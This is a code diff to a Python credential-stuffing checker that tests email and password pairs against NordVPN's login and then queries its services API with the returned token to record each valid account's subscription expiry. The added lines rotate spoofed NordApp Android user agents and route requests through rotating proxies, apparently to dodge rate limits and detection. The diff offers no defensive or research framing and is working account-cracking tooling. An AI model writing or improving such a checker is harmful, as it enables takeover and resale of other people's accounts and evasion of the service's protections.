@@ -1,4 +1,4 @@
-import requests, time
+import requests, time, random
 from os import sys
 
 class Main:
@@ -13,6 +13,15 @@ class Main:
             'save_dead': False,
             'proxy_list': [],
         }
+        self.user_agents = ['NordApp android (playstore/4.1.3) Android 5.1',
+               'NordApp android (playstore/4.1.3) Android 6.0',
+               'NordApp android (playstore/4.1.3) Android 7.1',
+               'NordApp android (playstore/4.1.3) Android 8.0',
+               'NordApp android (playstore/4.1.3) Android 9.0',
+               'NordApp android (playstore/4.1.3) Android 10.0',
+               'NordApp android (playstore/4.1.3) Android 4.2.2',
+               'NordApp android (playstore/4.1.3) Android 4.4.2',
+               'NordApp android (playstore/4.1.3) Android 5.1.1']
         
     def checker(self, email, password):
         if self.data['use_proxy'] == False:
@@ -37,9 +46,21 @@ class Main:
         
         elif resp_json.get('user_id') != None:
             if self.data['use_proxy'] == False:
-                return {'process': True, 'data': {'email': email, 'password': password, 'expires_at': resp_json['expires_at']}}
+                expires = requests.get("https://api.nordvpn.com/v1/users/services", headers={"User-Agent": random.choice(self.user_agents)}, auth=('token', resp_json['token']))
             else:
-                return {'process': True, 'message': self.data['proxy_list'][0], 'data': {'email': email, 'password': password, 'expires_at': resp_json['expires_at']}}
+                try:
+                    expires = requests.get("https://api.nordvpn.com/v1/users/services", headers={"User-Agent": random.choice(self.user_agents)}, auth=('token', resp_json['token']), proxies={'http': f"http://{self.data['proxy_list'][0]}", 'https': f"http://{self.data['proxy_list'][0]}"})
+                except Exception as e:
+                    self.renewProxy(self.data['proxy_list'][0])
+                    return {'process': False, 'message': "Error to execute request", 'data': {'email': email, 'password': password}}
+            expires_data = expires.json()
+            if isinstance(expires_data, list) == False:
+                return {'process': False, 'message': expires_data['errors'][0]['message'], 'data': {'email': email, 'password': password}}
+            else:
+                if self.data['use_proxy'] == False:
+                    return {'process': True, 'data': {'email': email, 'password': password, 'expires_at': expires_data[0]['expires_at']}}
+                else:
+                    return {'process': True, 'message': self.data['proxy_list'][0], 'data': {'email': email, 'password': password, 'expires_at': expires_data[0]['expires_at']}}
 
 
         
